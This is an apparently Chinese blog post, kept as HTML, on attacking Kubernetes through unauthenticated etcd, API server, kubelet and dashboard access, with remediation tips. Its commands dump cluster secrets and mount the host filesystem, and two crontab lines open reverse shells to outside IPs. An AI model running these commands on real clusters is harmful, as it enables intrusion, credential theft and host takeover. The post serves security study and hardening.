@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>K8s攻防 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 云安全' />
+  <meta itemprop="name" content="k8s攻防">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="1738">
+  <meta itemprop="keywords" content="攻防,云安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BA%91%E5%AE%89%E5%85%A8/73/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="k8s攻防">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="云安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="k8s攻防">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BA%91%E5%AE%89%E5%85%A8/73/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/linux/51/" /><link rel="next" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AF%AD%E8%A8%80/java/servlet/92/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "k8s攻防",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F\/%E4%BA%91%E5%AE%89%E5%85%A8\/73\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 云安全","wordcount":  1738 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F\/%E4%BA%91%E5%AE%89%E5%85%A8\/73\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">K8s攻防</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>K8s攻防</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1738 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>9 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405222242086.webp" alt="image-20240522224209921" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405222242086.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405222242086.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405222242086.webp?size=large 2x" data-title="image-20240522224209921" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405301504998.webp" alt="image-20240530150415832" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405301504998.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405301504998.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405301504998.webp?size=large 2x" data-title="image-20240530150415832" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405301712708.webp" alt="image-20240530171211546" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405301712708.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405301712708.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405301712708.webp?size=large 2x" data-title="image-20240530171211546" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405302127268.webp" alt="img" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405302127268.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405302127268.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405302127268.webp?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h5 id="kubernetesk8s攻击面整理" class="heading-element"><span>0.0.0.1  Kubernetes（k8s）攻击面整理</span>
+  <a href="#kubernetesk8s%e6%94%bb%e5%87%bb%e9%9d%a2%e6%95%b4%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>k8s集群主要由以下组件组成：</p>
+<p>1）kube-apiserver：k8s master节点api服务器，以REST API服务形式提供接⼝，作为整个k8s的控制⼊⼝。</p>
+<p>2）kube-controller-manager：执⾏整个k8s的后台任务，包括节点状态状况、Pod个数、Pods和Service的关联等。</p>
+<p>3）kube-scheduler：接收来⾃kube-apiserver创建Pods任务，通过收集的集群中所有node节点的资源负载情况分配到某个节点。</p>
+<p>4）etcd：k8s的键值对形式数据库,保存了k8s所有集群数据的后台数据库</p>
+<p>5）kube-proxy：运⾏在每个node节点上，负责pod⽹络代理。定时从etcd获取到service信息来做相应的策略。</p>
+<p>6）kubelet：运⾏在每个node节点上，作为agent，接收分配该节点的pods任务及管理容器，周期性获取容器状态，反馈给kube-apiserver</p>
+<p>漏洞点主要是在上面提到的<strong>重点组件</strong>内：</p>
+<p>kube-apiserver、kubelet、etcd、dashboard、docker、kube-proxy</p>
+<table>
+<thead>
+<tr>
+<th>组件</th>
+<th>常用端口</th>
+<th>脆弱点</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>kube-apiserver</td>
+<td>6443、8080</td>
+<td>未授权访问</td>
+<td>节点API服务器</td>
+</tr>
+<tr>
+<td>kubelet</td>
+<td>10250(https)、10255</td>
+<td>未授权访问</td>
+<td></td>
+</tr>
+<tr>
+<td>etcd</td>
+<td>2379</td>
+<td>未授权访问</td>
+<td>数据库</td>
+</tr>
+<tr>
+<td>docker</td>
+<td>2375</td>
+<td>未授权访问</td>
+<td></td>
+</tr>
+<tr>
+<td>dashboard</td>
+<td>30000+</td>
+<td>认证绕过CVE-2018-18264未授权</td>
+<td>k8s的Web管理接口：未做鉴权，直接操作集群</td>
+</tr>
+<tr>
+<td>kube-proxy</td>
+<td></td>
+<td>配置错误</td>
+<td></td>
+</tr>
+<tr>
+<td>cadvisor（k8s的监控）</td>
+<td>4194、8080</td>
+<td>未授权</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h6 id="常规利用" class="heading-element"><span>0.0.0.1.1  常规利用</span>
+  <a href="#%e5%b8%b8%e8%a7%84%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### etcd - 未授权访问</p>
+<p>etcd是⼀个key-value数据库，为k8s集群提供底层数据存储。</p>
+<p><strong>未授权访问</strong>：数据库敏感内容若无加密处理，会被攻击者加以利用，甚至控制整个集群</p>
+<p><strong>修复建议</strong>：通过 &ndash;client-cert-auth 开启证书校验，开启访问控制</p>
+<pre tabindex="0"><code>#####检测利用
+
+http://IP:2379/version
+http://IP:2379/v2/keys         #有v2和v3两个版本
+http://172.29.17.36:2379/v2/keys/?recursive=true</code></pre><p>etcdctl <a href="https://github.com/etcd-io/etcd/releases/"target="_blank" rel="external nofollow noopener noreferrer">工具地址</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#58a1dd">ETCDCTL_API</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">3</span> ./etcdctl --endpoints<span style="color:#ff636f">=</span>http://IP:2379/ get / --prefix --keys-only       <span style="color:#828b96;font-style:italic">#遍历所有的key</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ETCDCTL_API</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">3</span> ./etcdctl --insecure-transport<span style="color:#ff636f">=</span><span style="color:#58a1dd">false</span> --insecure-skip-tls-verify --endpoints<span style="color:#ff636f">=</span>https://IP:2379/ get / --prefix --keys-only         <span style="color:#828b96;font-style:italic"># --insecure-transport --insecure-skip-tls-verify 忽略证书校验</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ETCDCTL_API</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">3</span> ./etcdctl --insecure-transport<span style="color:#ff636f">=</span><span style="color:#58a1dd">false</span> --insecure-skip-tls-verify --endpoints<span style="color:#ff636f">=</span>https://IP:2379/ get / --prefix --keys-only | sort |
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uniq | xargs -I<span style="color:#ff636f">{}</span> sh -c <span style="color:#a6be9d">&#39;ETCDCTL_API=3 ./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">get {} &gt;&gt; output.data &amp;&amp; echo &#34;&#34; &gt;&gt; output.data&#39;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####通过v3 API来dump数据库到 output.data（输出格式：一行key+一行value）</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ETCDCTL_API</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">3</span> ./etcdctl --insecure-transport<span style="color:#ff636f">=</span><span style="color:#58a1dd">false</span> --insecure-skip-tls-verify --endpoints<span style="color:#ff636f">=</span>https://IP:2379/ get / --prefix --keys-only|sort|uniq|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>grep secret    <span style="color:#828b96;font-style:italic">#   查找secret相关keys</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 通过 get /registry/secrets/default/admin-token-557l2 拿到 token</span></span></span></code></pre></div><p>dump下etcd，定位 apiserver 和 所有证书； 检索关键字 advertiseAddress | kubeAPIConfig 定位 apiserver的地址</p>
+<p>使用curl 访问api server，确认token是否正确可用；</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl --header <span style="color:#a6be9d">&#34;Authorization: Bearer [TOKEN]&#34;</span> -X GET https://API_SERVER:6443/api -k</span></span></code></pre></div><p>token错误，返回401</p>
+<pre tabindex="0"><code>{ &#34;kind&#34;: &#34;Status&#34;, &#34;apiVersion&#34;: &#34;v1&#34;, &#34;metadata&#34;: {}, &#34;status&#34;: &#34;Failure&#34;, &#34;message&#34;: &#34;Unauthorized&#34;, &#34;reason&#34;:&#34;Unauthorized&#34;, &#34;code&#34;: 401}</code></pre><p>token正确，返回</p>
+<pre tabindex="0"><code>{ &#34;kind&#34;: &#34;APIVersions&#34;, &#34;versions&#34;: [ &#34;v1&#34; ],&#34;serverAddressByClientCIDRs&#34;: [ { &#34;clientCIDR&#34;: &#34;xxxx&#34;, &#34;serverAddress&#34;:&#34;xxxx&#34; } ]}</code></pre><p>方式一：执⾏kubectl config命令，来⽣成简单的临时配置⽂件</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>touch test_config
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl --kubeconfig<span style="color:#ff636f">=</span>./test_config config set-credentials hacker --token<span style="color:#ff636f">=</span>TOKEN
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl --kubeconfig<span style="color:#ff636f">=</span>./test_config config set-cluster hacked_cluster --server<span style="color:#ff636f">=</span>https://IP:6443/  --insecure-skip-tls-verify
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl --kubeconfig<span style="color:#ff636f">=</span>./test_config config set-context test_context --cluster<span style="color:#ff636f">=</span>hacked_cluster --user<span style="color:#ff636f">=</span>hacker
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl --kubeconfig<span style="color:#ff636f">=</span>./test_config config use-context test_context       <span style="color:#828b96;font-style:italic"># 生成临时配置文件</span></span></span></code></pre></div><p>通过该配置文件访问api server，达到控制k8s集群的目标：</p>
+<pre tabindex="0"><code>brew install kubectl    #  mac安装kubectl
+
+kubectl --kubeconfig=./test_config get nodes -A      #管控集群</code></pre><p>扩大权限，使用kubectl 导出所有secret，利用优于etcd</p>
+<pre tabindex="0"><code>kubectl --kubeconfig=./test_config get secret -A -o custom-columns=:.metadata.name,:.metadata.namespace --no-headers | xargs -n 2 sh -c &#39;(kubectl --kubeconfig=./test_config get secret -n $3 -o yaml $2; echo &#34;&#34;) &gt;&gt; all_secrets_yaml.txt&#39; -- {}</code></pre><p>方式二：找到token配置：</p>
+<pre tabindex="0"><code>ETCDCTL_API=3 ./etcdctl --endpoints=http://0.0.0.0:2379/ get --keys-only --prefix=true &#34;/&#34; | grep /secrets/kube-system/clusterrole</code></pre><p>获取token：</p>
+<pre tabindex="0"><code>ETCDCTL_API=3 ./etcdctl --endpoints=http://0.0.0.0:2379/ get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-n6mll</code></pre><p>通过该token可以获取操作k8s集群的权限</p>
+<p>使用token获取nodes节点信息</p>
+<pre tabindex="0"><code>kubectl --insecure-skip-tls-verify -s https://0.0.0.0:6443 --token=&#34;&#34; -n kube-system get nodes</code></pre><p>####### Kube apiserver - 未授权访问</p>
+<p>k8s api server 存在未授权访问，攻击者可通过kubectl创建恶意pod或控制已有pod，后续可逃逸至宿主机</p>
+<p><strong>修复建议</strong>：使用安全端口替代8080端口，并使用 &ndash;tls-cert-file参数</p>
+<p>直接访问：http://ip:port/，回显接口信息</p>
+<p>访问 http://ip:8080/api/v1/namespaces/kube-system/secrets/ 拿到token</p>
+<p>创建kubectl配置⽂件，指定⽬标地址和拿到的token等</p>
+<pre tabindex="0"><code>kubectl--kubeconfig=./test_config get pod -n kube-system -o wide
+##### 通过kubectl使⽤kube-system的token获取pod列表。之后可进⼀步创建pod或控制已有pod进⾏命令执⾏等操作</code></pre><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl –insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “https://IP:10250/exec/namespace/podID/containername?command<span style="color:#ff636f">=</span>touch&amp;<span style="color:#58a1dd">command</span><span style="color:#ff636f">=</span>/tmp/test&amp;<span style="color:#58a1dd">input</span><span style="color:#ff636f">=</span>1&amp;<span style="color:#58a1dd">output</span><span style="color:#ff636f">=</span>1&amp;<span style="color:#58a1dd">tty</span><span style="color:#ff636f">=</span>1<span style="color:#a6be9d">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">kubectl -s ip:8080 get node # 获取节点
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">kubectl -s 127.0.0.1:8080 get pods # 获取Pods
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">kubectl -s 127.0.0.1:8080 --namespace=default exec -it nginxfromuzju-59595f6ffc-p8xvk bash   #执行命令</span></span></span></code></pre></div><p>PS：较高版本的k8s，需要获取service-account-token，通过访问api来获取token</p>
+<p><code>/api/v1/namespaces/kube-system/secrets/</code></p>
+<p>获取宿主机权限-通过k8s dashboard，创建特权Pods</p>
+<pre tabindex="0"><code>echo -e &#34;* /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.139/1234 0&gt;&amp;1&#34; &gt;&gt; /mnt/etc/crontab
+##### 然后通过dashboard创建pod并挂在宿主机的任意⽬录；然后写crontab获取shell</code></pre><p>####### Kubelet - 未授权访问</p>
+<p>k8s node对外开启10250(kubelet API)和10255端⼝(readonly API)，攻击者可创建恶意pod或控制已有pod，后续可尝试逃逸⾄宿主机</p>
+<p><strong>修复建议</strong>：</p>
+<p>1.readOnlyPort=0：关闭只读端⼝(默认 10255)；</p>
+<p>2.authentication.anonymous.enabled：设置为 false，不允许匿名访问 10250 端⼝；</p>
+<p>3.authentication.x509.clientCAFile：指定签名客户端证书的 CA 证书，开启 HTTP 证书认证；authentication.webhook.enabled=true：开启 HTTPs bearer token 认证</p>
+<p><code>curl http://ip:10250/pods</code></p>
+<p>使用kubeletctl 批量获取pod等信息：</p>
+<p><code>./kubeletctl  pods -s ip -p port</code></p>
+<p>可使⽤kubeletctl在特权pod内执⾏命令，挂载宿主机根⽬录，通过向宿主机批量写⼊ssh公钥逃逸到宿主机</p>
+<p>####### Dashboard</p>
+<p>######## Dashboard未授权访问</p>
+<p><strong>漏洞描述</strong>
+K8s Dashboard默认是存在鉴权机制的，用户可以通过kubeconfig或者Token两种方式登录，当用户开启了enable-skip-login时可以在登录界面点击Skip跳过登录直接进入Dashboard，而且有时候可以直接访问K8s DashBoard，在这种情况下攻击者可以通过部署恶意Pod实现控制节点的目的</p>
+<p><strong>漏洞复现</strong>
+K8s DashBoard未授权访问：</p>
+<p><strong>宿主Shell</strong></p>
+<p>Step 1：通过WEB UI界面创建一个pod，并将本地根目录挂载到pod的/mnt目录中</p>
+<pre tabindex="0"><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: myapp
+spec:
+  containers:
+  - image: nginx
+    name: container
+    volumeMounts:
+    - mountPath: /mnt
+      name: test-volume
+  volumes:
+  - name: test-volume
+    hostPath:
+      path: /</code></pre><p>Step 2：之后可以看到创建的myapp Pod</p>
+<p>Step 3：之后进入挂载的/mnt目录中，就是master节点的对应目录了</p>
+<p>Step 4：之后写计划任务</p>
+<pre tabindex="0"><code>echo -e &#34;* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.17.157/4444 0&gt;&amp;1\n&#34; &gt;&gt; /mnt/etc/crontab</code></pre><p>######## k8s dashboard认证绕过（CVE-2018-18264）</p>
+<p>攻击者可跳过登录，直接进⼊dashboard web⻚获取pod和job等状态，并可创建恶意pod，尝试逃逸⾄宿主机</p>
+<p><strong>修复建议</strong>：关闭dashboard的&ndash;enable-skip-login</p>
+<p>登录页面选择跳过登录 -&gt; 可通过dashboard获取pod、node和job等状态</p>
+<p>若业务配置错误或为了⽅便给 Kubernetes dashboard 绑定 cluster-admin等⻆⾊，攻击者可直接在界⾯上创建特权 pod 进⾏容器逃逸</p>
